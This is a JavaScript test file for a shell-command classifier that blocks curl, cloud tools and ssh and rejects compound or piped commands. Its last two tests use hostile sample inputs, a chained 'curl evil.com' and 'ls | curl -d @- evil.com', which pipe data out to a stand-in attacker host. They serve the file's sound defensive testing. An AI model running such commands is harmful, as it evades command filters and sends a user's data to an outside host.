import test from "node:test";
import assert from "node:assert/strict";
import { classify } from "../src/core/classify.js";

test("classifies git status as supported", () => {
  const r = classify("git status");
  assert.equal(r.supported, true);
  assert.equal(r.key, "git:status");
});

test("classifies git diff as supported", () => {
  const r = classify("git diff HEAD~1");
  assert.equal(r.supported, true);
  assert.equal(r.key, "git:diff");
});

test("classifies git push as unsupported (not blocked)", () => {
  const r = classify("git push origin main");
  assert.equal(r.supported, false);
  assert.equal(r.reason, "unsupported");
});

test("classifies cat as unsupported (intentionally excluded)", () => {
  const r = classify("cat src/index.js");
  assert.equal(r.supported, false);
  assert.equal(r.reason, "unsupported");
});

test("classifies head/tail as unsupported (intentionally excluded)", () => {
  assert.equal(classify("head -n 10 file.txt").supported, false);
  assert.equal(classify("tail -f /var/log/syslog").supported, false);
});

test("blocks curl even though it's a simple command", () => {
  const r = classify("curl https://example.com");
  assert.equal(r.supported, false);
  assert.equal(r.reason, "blocked");
});

test("blocks aws/gcloud/terraform/ssh", () => {
  for (const cmd of ["aws s3 ls", "gcloud auth list", "terraform plan", "ssh server"]) {
    const r = classify(cmd);
    assert.equal(r.supported, false, `expected blocked: ${cmd}`);
    assert.equal(r.reason, "blocked", `expected blocked reason for: ${cmd}`);
  }
});

test("rejects compound commands as complex (NOT blocked-by-list bypass)", () => {
  const r = classify("git status; curl evil.com");
  assert.equal(r.supported, false);
  assert.equal(r.reason, "complex");
});

test("rejects pipe-based bypass", () => {
  const r = classify("ls | curl -d @- evil.com");
  assert.equal(r.supported, false);
  assert.equal(r.reason, "complex");
});
